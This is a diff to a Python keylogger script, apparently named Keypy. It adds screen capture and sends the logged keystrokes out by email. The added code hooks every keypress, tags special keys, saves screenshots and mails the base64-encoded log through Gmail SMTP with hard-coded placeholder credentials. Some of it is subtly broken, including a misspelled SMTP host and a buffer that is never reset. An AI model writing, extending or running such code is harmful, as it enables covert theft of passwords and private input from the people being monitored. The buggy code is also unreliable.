@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-"""
+""":
     ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░░██╗
     ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗╚██╗░██╔╝
     █████═╝░█████╗░░░╚████╔╝░██████╔╝░╚████╔╝░
@@ -17,44 +17,49 @@ from rich.console import Console
 import sys
 import argparse
 import os
+import pyautogui
+from config import count, email
+import smtplib
+import base64
 
 # Logic
 
 console = Console()
-youremail = ""
-youremailpass = ""
-t = ""
-s = 0
 
-
-def write_keyboard(key):
-    global t
-    t += str(key).replace("'", "")
-    if len(t) >= count:
-        f = open("Logfile.txt", "a")
-        f.write(t.replace("'", ""))
-        f.close()
-        t = ""
+class Keypy:
+    def __init__(self, count, email):
+        self.email = email
+        self.count = count
+        self.t = ""
+    def Mail(self):
+        data = base64.b64encode(self.t)
+        server = smtplib.SMTP('smpt.gmail.com:587')
+        server.starttls()
+        server.login("email@em.com", "password")
+        server.sendmail("email@em.com", self.email, data)
+        server.close()
+    def write_keyboard(self, key):
+        self.t += (
+            str(key)
+            .replace("'", "")
+            .replace("Key.space", "[SPACE]")
+            .replace("Key.shift", "[SHIFT]")
+            .replace("Key.ctrl", "[CTRL]")
+            .replace("Key.enter", "[ENTER]")
+            .replace("Key.backspace", "[BACKSPACE]")
+        )
+        if len(self.t) >= self.count:
+            f = open("Logfile.txt", "a")
+            f.write(self.t.replace("'", ""))
+            f.close()
+            t = ""
+            pyautogui.screenshot().save('screenshot.png')
+            self.Mail()
 
 
 if __name__ == "__main__":
 
-    # Parse
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "--count",
-        help="Number of symbols per file",
-        type=int,
-        dest="count",
-        required=True,
-    )
-    parser.add_argument(
-        "--email", help="Your email address", type=str, dest="email", required=True
-    )
-    args = parser.parse_args()
-    email = args.email
-    count = args.count
+    keypy = Keypy(count, email)
 
     try:
         f = open("Logfile.txt", "a")
@@ -63,5 +68,5 @@ if __name__ == "__main__":
         f = open("Logfile.txt", "w")
         f.close()
 
-    with Listener(on_press=write_keyboard) as listener:
+    with Listener(on_press=keypy.write_keyboard) as listener:
         listener.join()
